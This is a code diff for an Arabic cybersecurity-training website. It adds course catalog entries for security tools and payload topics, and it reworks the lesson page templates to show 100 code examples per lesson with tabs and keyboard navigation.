+    {"id": "burp1", "name": "Burp Suite - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "burp2", "name": "Burp Suite - هجمات", "level": "متقدم", "duration": "4 ساعات", "category": "الأدوات"},
+    {"id": "burp3", "name": "Burp Suite - المتقدم", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
+    {"id": "wireshark1", "name": "Wireshark - أساسيات", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات"},
+    {"id": "wireshark2", "name": "Wireshark - تحليل متقدم", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "wireshark3", "name": "Wireshark - اكتشاف الهجمات", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "payload1", "name": "الحمولات - Reverse Shell", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "payload2", "name": "الحمولات - Web Shell", "level": "متقدم", "duration": "2.5 ساعات", "category": "الأدوات"},
+    {"id": "payload3", "name": "الحمولات - Bind Shell", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "payload4", "name": "الحمولات - مخصصة", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
+    {"id": "payload5", "name": "الحمولات - في C", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
+    {"id": "hydra1", "name": "Hydra - كسر كلمات المرور", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "john1", "name": "John the Ripper", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "aircrack1", "name": "Aircrack-ng - Wi-Fi", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "sqlmap1", "name": "SQLmap - أساسيات", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات"},
+    {"id": "sqlmap2", "name": "SQLmap - متقدم", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "beef1", "name": "BeEF - استغلال المتصفح", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "social1", "name": "Social-Engineer Toolkit", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات"},
+    {"id": "maltego1", "name": "Maltego - OSINT", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات"},
+    {"id": "reconng1", "name": "Recon-ng - OSINT", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "theharvester1", "name": "theHarvester - جمع البريد", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات"},
+    {"id": "sherlock1", "name": "Sherlock - أفراد", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات"},
+    {"id": "gobuster1", "name": "Gobuster - مسح الدلائل", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "ffuf1", "name": "FFUF - مسح سريع", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "nikto1", "name": "Nikto - مسح الثغرات", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "wpscan1", "name": "WPScan - WordPress", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات"},
+    {"id": "droopescan1", "name": "Droopescan - Drupal", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "joomscan1", "name": "Joomscan - Joomla", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "nuclei1", "name": "Nuclei - ثغرات", "level": "متقدم", "duration": "2.5 ساعات", "category": "الأدوات"},
+    {"id": "katana1", "name": "Katana - الزحف", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "wayback1", "name": "Wayback Machine - الأرشيف", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات"},
+    {"id": "shodan1", "name": "Shodan - متقدم", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات"},
+    {"id": "censys1", "name": "Censys - المسح", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "zoomeye1", "name": "ZoomEye - المسح", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
+    {"id": "binary1", "name": "Binary Analysis - التحليل", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
+    {"id": "debugger1", "name": "Debugging - التصحيح", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
 ]
 
-# ===== دمج جميع الدورس =====
+# ===== دمج جميع الدورس مع توليد 100 كود لكل درس =====
 for course in programming_courses + pentest_courses + tools_courses:
+    # توليد 100 كود تعليمي
+    codes = generate_100_codes(course["id"], "")
+    
     COURSES_DATA[course["id"]] = {
         "name": course["name"],
         "level": course["level"],
         "duration": course["duration"],
         "category": course["category"],
-        "description": f"📚 درس متكامل في {course['name']}\n\n🎯 المستوى: {course['level']}\n⏱️ المدة: {course['duration']}\n📂 القسم: {course['category']}\n\nهذا الدرس يغطي جميع جوانب الموضوع مع أمثلة تطبيقية وأكواد عملية. ستتعلم من الصفر حتى الاحتراف.",
-        "code": course["code"]
+        "description": f"📚 درس متكامل في {course['name']}\n\n🎯 المستوى: {course['level']}\n⏱️ المدة: {course['duration']}\n📂 القسم: {course['category']}\n\nهذا الدرس يحتوي على 100 مثال تعليمي مختلف مع شرح لكل مثال.\n\n✅ 100 كود تعليمي\n✅ شرح مفصل لكل مثال\n✅ أمثلة تطبيقية متنوعة\n✅ من الصفر حتى الاحتراف",
+        "codes": codes  # 100 كود مختلف
     }
 
 # ===== قائمة الدورس للملاحة =====
@@ -170,7 +1023,6 @@ COURSE_PAGE_TEMPLATE = """
             flex-direction: column;
         }
         
-        /* ===== HEADER ===== */
         .header {
             background: rgba(0,0,0,0.95);
             border-bottom: 2px solid #00ff41;
@@ -184,18 +1036,9 @@ COURSE_PAGE_TEMPLATE = """
             top: 0;
             z-index: 100;
         }
-        .header-brand {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
+        .header-brand { display: flex; align-items: center; gap: 12px; }
         .brand-icon { font-size: 2rem; color: #00ff41; }
-        .brand-name {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #00ff41;
-            text-shadow: 0 0 20px #00ff41;
-        }
+        .brand-name { font-size: 1.5rem; font-weight: bold; color: #00ff41; text-shadow: 0 0 20px #00ff41; }
         .brand-sub { font-size: 0.7rem; color: #666; letter-spacing: 2px; }
         .back-btn {
             background: transparent;
@@ -208,28 +1051,16 @@ COURSE_PAGE_TEMPLATE = """
             font-family: inherit;
             text-decoration: none;
         }
-        .back-btn:hover {
-            background: #00ff41;
-            color: #000;
-            box-shadow: 0 0 30px #00ff41;
-        }
+        .back-btn:hover { background: #00ff41; color: #000; box-shadow: 0 0 30px #00ff41; }
         
-        /* ===== CONTAINER ===== */
-        .container {
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 30px 20px;
-            flex: 1;
-            width: 100%;
-        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 30px 20px; flex: 1; width: 100%; }
         
-        /* ===== COURSE CARD ===== */
         .course-card {
             background: rgba(0,0,0,0.9);
             border: 2px solid #00ff41;
             border-radius: 16px;
             padding: 40px;
-            box-shadow: 0 0 60px rgba(0,255,65,0.1), inset 0 0 60px rgba(0,255,65,0.02);
+            box-shadow: 0 0 60px rgba(0,255,65,0.1);
             animation: fadeIn 0.6s ease;
         }
         @keyframes fadeIn {
@@ -255,13 +1086,7 @@ COURSE_PAGE_TEMPLATE = """
             align-items: center;
             justify-content: center;
         }
-        .course-title {
-            font-size: 2.5rem;
-            font-weight: bold;
-            color: #00ff41;
-            text-shadow: 0 0 40px #00ff41;
-            flex: 1;
-        }
+        .course-title { font-size: 2.5rem; font-weight: bold; color: #00ff41; text-shadow: 0 0 40px #00ff41; flex: 1; }
         .course-badge {
             padding: 5px 20px;
             border-radius: 20px;
@@ -283,21 +1108,9 @@ COURSE_PAGE_TEMPLATE = """
             border-radius: 12px;
             border: 1px solid #1a1a1a;
         }
-        .meta-item {
-            text-align: center;
-        }
-        .meta-label {
-            color: #666;
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        .meta-value {
-            font-size: 1.2rem;
-            color: #00ff41;
-            font-weight: bold;
-            margin-top: 3px;
-        }
+        .meta-item { text-align: center; }
+        .meta-label { color: #666; font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; }
+        .meta-value { font-size: 1.2rem; color: #00ff41; font-weight: bold; margin-top: 3px; }
         
         .course-description {
             background: rgba(0,255,65,0.03);
@@ -320,6 +1133,41 @@ COURSE_PAGE_TEMPLATE = """
             font-size: 1.3rem;
             letter-spacing: 2px;
         }
+        .code-section .code-count {
+            color: #888;
+            font-size: 0.8rem;
+            margin-left: 10px;
+        }
+        
+        .code-tabs {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: rgba(255,255,255,0.02);
+            border-radius: 8px;
+            border: 1px solid #1a1a1a;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .code-tabs::-webkit-scrollbar { width: 4px; background: #0a0a0a; }
+        .code-tabs::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
+        
+        .code-tab {
+            padding: 6px 15px;
+            border-radius: 6px;
+            border: 1px solid #1a1a1a;
+            background: transparent;
+            color: #888;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 0.7rem;
+            transition: 0.3s;
+        }
+        .code-tab:hover { border-color: #00ff41; color: #00ff41; }
+        .code-tab.active { border-color: #00ff41; color: #00ff41; background: rgba(0,255,65,0.05); }
+        
         .code-block {
             background: #0d0d0d;
             border: 1px solid #1a1a1a;
@@ -350,10 +1198,7 @@ COURSE_PAGE_TEMPLATE = """
             font-family: inherit;
             font-size: 0.7rem;
         }
-        .code-block .copy-btn:hover {
-            border-color: #00ff41;
-            color: #00ff41;
-        }
+        .code-block .copy-btn:hover { border-color: #00ff41; color: #00ff41; }
         .code-block code {
             color: #00ff88;
             font-family: 'Courier New', monospace;
@@ -382,35 +1227,13 @@ COURSE_PAGE_TEMPLATE = """
             text-decoration: none;
             display: inline-block;
         }
-        .action-btn.primary {
-            border-color: #00ff41;
-            color: #00ff41;
-        }
-        .action-btn.primary:hover {
-            background: #00ff41;
-            color: #000;
-            box-shadow: 0 0 40px #00ff41;
-        }
-        .action-btn.secondary {
-            border-color: #ff00ff;
-            color: #ff00ff;
-        }
-        .action-btn.secondary:hover {
-            background: #ff00ff;
-            color: #000;
-            box-shadow: 0 0 40px #ff00ff;
-        }
-        .action-btn.danger {
-            border-color: #ff3333;
-            color: #ff3333;
-        }
-        .action-btn.danger:hover {
-            background: #ff3333;
-            color: #000;
-            box-shadow: 0 0 40px #ff3333;
-        }
+        .action-btn.primary { border-color: #00ff41; color: #00ff41; }
+        .action-btn.primary:hover { background: #00ff41; color: #000; box-shadow: 0 0 40px #00ff41; }
+        .action-btn.secondary { border-color: #ff00ff; color: #ff00ff; }
+        .action-btn.secondary:hover { background: #ff00ff; color: #000; box-shadow: 0 0 40px #ff00ff; }
+        .action-btn.danger { border-color: #ff3333; color: #ff3333; }
+        .action-btn.danger:hover { background: #ff3333; color: #000; box-shadow: 0 0 40px #ff3333; }
         
-        /* ===== FOOTER ===== */
         .footer {
             margin-top: 30px;
             padding: 20px 30px;
@@ -435,12 +1258,7 @@ COURSE_PAGE_TEMPLATE = """
             padding: 2px 8px;
             user-select: none;
         }
-        .hidden-support:hover {
-            color: #0a0a0a !important;
-            background: #0a0a0a !important;
-        }
         
-        /* ===== SUPPORT MODAL ===== */
         .support-modal {
             display: none;
             position: fixed;
@@ -462,33 +1280,10 @@ COURSE_PAGE_TEMPLATE = """
             width: 90%;
             box-shadow: 0 0 80px rgba(255,0,255,0.2);
         }
-        .support-modal-content h2 {
-            color: #ff00ff;
-            font-size: 2rem;
-            text-shadow: 0 0 30px #ff00ff;
-        }
-        .support-modal-content .contact {
-            font-size: 1.5rem;
-            color: #00ff41;
-            padding: 15px;
-            border: 1px solid #00ff41;
-            border-radius: 8px;
-            margin: 20px 0;
-        }
-        .support-modal-content .close-btn {
-            background: transparent;
-            border: 1px solid #ff3333;
-            color: #ff3333;
-            padding: 10px 30px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-family: inherit;
-            transition: 0.3s;
-        }
-        .support-modal-content .close-btn:hover {
-            background: #ff3333;
-            color: #000;
-        }
+        .support-modal-content h2 { color: #ff00ff; font-size: 2rem; text-shadow: 0 0 30px #ff00ff; }
+        .support-modal-content .contact { font-size: 1.5rem; color: #00ff41; padding: 15px; border: 1px solid #00ff41; border-radius: 8px; margin: 20px 0; }
+        .support-modal-content .close-btn { background: transparent; border: 1px solid #ff3333; color: #ff3333; padding: 10px 30px; border-radius: 4px; cursor: pointer; font-family: inherit; transition: 0.3s; }
+        .support-modal-content .close-btn:hover { background: #ff3333; color: #000; }
         
         @media (max-width: 700px) {
             .course-title { font-size: 1.8rem; }
@@ -499,9 +1294,8 @@ COURSE_PAGE_TEMPLATE = """
             .course-meta { grid-template-columns: 1fr 1fr; }
             .action-buttons { flex-direction: column; }
             .action-btn { text-align: center; }
-        }
-        @media (max-width: 400px) {
-            .course-meta { grid-template-columns: 1fr; }
+            .code-tabs { max-height: 150px; }
+            .code-tab { font-size: 0.6rem; padding: 4px 10px; }
         }
     </style>
 </head>
@@ -551,33 +1345,46 @@ COURSE_PAGE_TEMPLATE = """
                     <div class="meta-value">{{ course.category }}</div>
                 </div>
                 <div class="meta-item">
-                    <div class="meta-label">🔑 المعرف</div>
-                    <div class="meta-value" style="font-size:0.8rem;color:#888;">{{ course_id }}</div>
+                    <div class="meta-label">📝 الأمثلة</div>
+                    <div class="meta-value" style="color:#ff00ff;">100 كود</div>
                 </div>
             </div>
 
             <div class="course-description">{{ course.description }}</div>
 
             <div class="code-section">
-                <h3>💻 الكود التعليمي</h3>
-                <div class="code-block">
+                <h3>💻 100 كود تعليمي <span class="code-count">(اختر المثال الذي تريد)</span></h3>
+                
+                <div class="code-tabs" id="codeTabs">
+                    {% for i in range(1, 101) %}
+                    <button class="code-tab {% if i == 1 %}active{% endif %}" data-index="{{ i-1 }}" onclick="showCode({{ i-1 }})">
+                        مثال {{ i }}
+                    </button>
+                    {% endfor %}
+                </div>
+
+                <div class="code-block" id="codeDisplay">
                     <span class="lang-tag">
                         {% if 'python' in course_id %}🐍 Python
                         {% elif 'cpp' in course_id %}⚙️ C++
                         {% elif 'js' in course_id %}🟨 JavaScript
                         {% elif 'assembly' in course_id %}⚡ Assembly
                         {% elif 'bash' in course_id %}💻 Bash
-                        {% elif 'sqlmap' in course_id %}🗄️ SQL
+                        {% elif 'sqlmap' in course_id or 'exploit' in course_id %}🗄️ SQL
                         {% elif 'nmap' in course_id %}🌐 Nmap
                         {% elif 'metasploit' in course_id %}🛠️ Metasploit
                         {% elif 'burp' in course_id %}🔧 Burp
                         {% elif 'wireshark' in course_id %}📦 Wireshark
                         {% elif 'payload' in course_id %}🧬 Payload
+                        {% elif 'recon' in course_id %}🔍 Recon
+                        {% elif 'crypto' in course_id %}🔐 Crypto
+                        {% elif 'wifi' in course_id %}📶 WiFi
+                        {% elif 'mobile' in course_id %}📱 Mobile
                         {% else %}💻 Code
                         {% endif %}
                     </span>
                     <button class="copy-btn" onclick="copyCode()">📋 نسخ</button>
-                    <code id="lessonCode">{{ course.code }}</code>
+                    <code id="lessonCode">{{ course.codes[0] }}</code>
                 </div>
             </div>
 
@@ -590,7 +1397,7 @@ COURSE_PAGE_TEMPLATE = """
     </div>
 
     <footer class="footer">
-        <span class="footer-text">© 2026 ABOOD_SECURE_ACADEMY</span>
+        <span class="footer-text">© 2026 ABOOD_SECURE_ACADEMY - 100 مثال لكل درس</span>
         <div class="footer-links">
             <a href="/">الرئيسية</a>
             <button class="hidden-support" id="supportTrigger">للاستفسارات الفورية</button>
@@ -607,6 +1414,20 @@ COURSE_PAGE_TEMPLATE = """
     </div>
 
     <script>
+        // بيانات الأكواد (100 كود)
+        const codes = {{ course.codes|tojson }};
+        let currentIndex = 0;
+
+        function showCode(index) {
+            currentIndex = index;
+            document.getElementById('lessonCode').textContent = codes[index];
+            
+            // تحديث التبويبات
+            document.querySelectorAll('.code-tab').forEach((tab, i) => {
+                tab.classList.toggle('active', i === index);
+            });
+        }
+
         function copyCode() {
             const code = document.getElementById('lessonCode');
             navigator.clipboard.writeText(code.textContent).then(() => {
@@ -620,7 +1441,7 @@ COURSE_PAGE_TEMPLATE = """
             if (navigator.share) {
                 navigator.share({
                     title: '{{ course.name }}',
-                    text: 'درس تعليمي من أكاديمية عبود للأمن السيبراني',
+                    text: 'درس تعليمي من أكاديمية عبود للأمن السيبراني - 100 مثال',
                     url: window.location.href
                 });
             } else {
@@ -656,8 +1477,20 @@ COURSE_PAGE_TEMPLATE = """
             }
         });
 
+        // التنقل بين الأكواد عبر الأسهم
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'ArrowRight' && currentIndex < 99) {
+                showCode(currentIndex + 1);
+                e.preventDefault();
+            } else if (e.key === 'ArrowLeft' && currentIndex > 0) {
+                showCode(currentIndex - 1);
+                e.preventDefault();
+            }
+        });
+
         console.log('%c◼ ABOOD_SECURE_ACADEMY ◼', 'color: #00ff41; font-size: 20px; font-weight: bold;');
-        console.log(`%cالدرس الحالي: {{ course.name }}`, 'color: #888; font-size: 14px;');
+        console.log(`%cالدرس الحالي: {{ course.name }} - 100 مثال`, 'color: #888; font-size: 14px;');
+        console.log('%cاستخدم الأسهم → ← للتنقل بين الأمثلة', 'color: #ffaa00; font-size: 12px;');
         console.log('%cجميع الحقوق محفوظة © 2026', 'color: #444; font-size: 12px;');
     </script>
 </body>
@@ -705,24 +1538,14 @@ HOME_PAGE_TEMPLATE = """
 
         .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
 
-        /* ===== HERO ===== */
         .hero {
             text-align: center;
             padding: 40px 20px;
             border-bottom: 1px solid #1a1a1a;
             margin-bottom: 30px;
         }
-        .hero h1 {
-            font-size: 3rem;
-            color: #00ff41;
-            text-shadow: 0 0 50px #00ff41;
-            margin-bottom: 10px;
-        }
-        .hero p {
-            color: #888;
-            font-size: 1.1rem;
-            letter-spacing: 3px;
-        }
+        .hero h1 { font-size: 3rem; color: #00ff41; text-shadow: 0 0 50px #00ff41; margin-bottom: 10px; }
+        .hero p { color: #888; font-size: 1.1rem; letter-spacing: 3px; }
         .hero .stats {
             display: flex;
             justify-content: center;
@@ -738,10 +1561,7 @@ HOME_PAGE_TEMPLATE = """
             border-radius: 20px;
         }
 
-        /* ===== CATEGORIES ===== */
-        .category-section {
-            margin-bottom: 40px;
-        }
+        .category-section { margin-bottom: 40px; }
         .category-title {
             color: #ff00ff;
             font-size: 1.5rem;
@@ -750,10 +1570,7 @@ HOME_PAGE_TEMPLATE = """
             padding-bottom: 10px;
             margin-bottom: 20px;
         }
-        .category-title .count {
-            color: #444;
-            font-size: 0.8rem;
-        }
+        .category-title .count { color: #444; font-size: 0.8rem; }
 
         .courses-grid {
             display: grid;
@@ -761,7 +1578,6 @@ HOME_PAGE_TEMPLATE = """
             gap: 20px;
         }
 
-        /* ===== COURSE CARD ===== */
         .course-card {
             background: rgba(0,0,0,0.9);
             border: 1px solid #1a1a1a;
@@ -808,8 +1624,15 @@ HOME_PAGE_TEMPLATE = """
             padding-top: 10px;
         }
         .course-card .card-meta span { display: flex; align-items: center; gap: 4px; }
+        .course-card .card-badge {
+            background: rgba(255,0,255,0.1);
+            color: #ff00ff;
+            font-size: 0.5rem;
+            padding: 2px 8px;
+            border-radius: 10px;
+            border: 1px solid #ff00ff;
+        }
 
-        /* ===== FOOTER ===== */
         .footer {
             margin-top: 30px;
             padding: 20px 30px;
@@ -833,10 +1656,6 @@ HOME_PAGE_TEMPLATE = """
             font-size: 0.6rem;
             padding: 2px 8px;
             user-select: none;
-        }
-        .hidden-support:hover {
-            color: #0a0a0a !important;
-            background: #0a0a0a !important;
         }
 
         .support-modal {
@@ -865,7 +1684,6 @@ HOME_PAGE_TEMPLATE = """
         .support-modal-content .close-btn { background: transparent; border: 1px solid #ff3333; color: #ff3333; padding: 10px 30px; border-radius: 4px; cursor: pointer; font-family: inherit; transition: 0.3s; }
         .support-modal-content .close-btn:hover { background: #ff3333; color: #000; }
 
-        /* ===== SEARCH ===== */
         .search-box {
             width: 100%;
             max-width: 500px;
@@ -898,11 +1716,12 @@ HOME_PAGE_TEMPLATE = """
             <span class="brand-icon">⚡</span>
             <div>
                 <div class="brand-name">ABOOD_SECURE_ACADEMY</div>
-                <div class="brand-sub">// 100+ LESSON // FROM ZERO TO HERO //</div>
+                <div class="brand-sub">// 100+ LESSON // 100 CODE EACH //</div>
             </div>
         </div>
         <div style="display:flex;gap:15px;align-items:center;flex-wrap:wrap;">
             <span class="header-count">📚 {{ course_list|length }} درس</span>
+            <span class="header-count">💻 100 كود لكل درس</span>
             <span class="header-badge">● ROOT ACCESS</span>
         </div>
     </header>
@@ -913,7 +1732,7 @@ HOME_PAGE_TEMPLATE = """
             <p>من الصفر إلى الاحتراف في البرمجة والأمن السيبراني</p>
             <div class="stats">
                 <span>📚 {{ course_list|length }} درس</span>
-                <span>💻 3 أقسام</span>
+                <span>💻 100 كود لكل درس</span>
                 <span>🛡️ تعليم حقيقي</span>
             </div>
         </div>
@@ -947,6 +1766,7 @@ HOME_PAGE_TEMPLATE = """
                     <div class="card-meta">
                         <span>⏱️ {{ courses_data[course.id].duration }}</span>
                         <span>📂 {{ category }}</span>
+                        <span class="card-badge">💯 100 كود</span>
                     </div>
                 </a>
                 {% endfor %}
@@ -956,7 +1776,7 @@ HOME_PAGE_TEMPLATE = """
     </div>
 
     <footer class="footer">
-        <span class="footer-text">© 2026 ABOOD_SECURE_ACADEMY - 100+ درس تعليمي</span>
+        <span class="footer-text">© 2026 ABOOD_SECURE_ACADEMY - 100 كود لكل درس</span>
         <div class="footer-links">
             <a href="/">الرئيسية</a>
             <button class="hidden-support" id="supportTrigger">للاستفسارات الفورية</button>
@@ -1008,7 +1828,7 @@ HOME_PAGE_TEMPLATE = """
         });
 
         console.log('%c◼ ABOOD_SECURE_ACADEMY ◼', 'color: #00ff41; font-size: 20px; font-weight: bold;');
-        console.log('%cمنصة تعليمية شاملة - 100+ درس تعليمي', 'color: #888; font-size: 14px;');
+        console.log('%cمنصة تعليمية شاملة - 100 كود لكل درس', 'color: #888; font-size: 14px;');
         console.log('%cجميع الحقوق محفوظة © 2026', 'color: #444; font-size: 12px;');
     </script>
 </body>
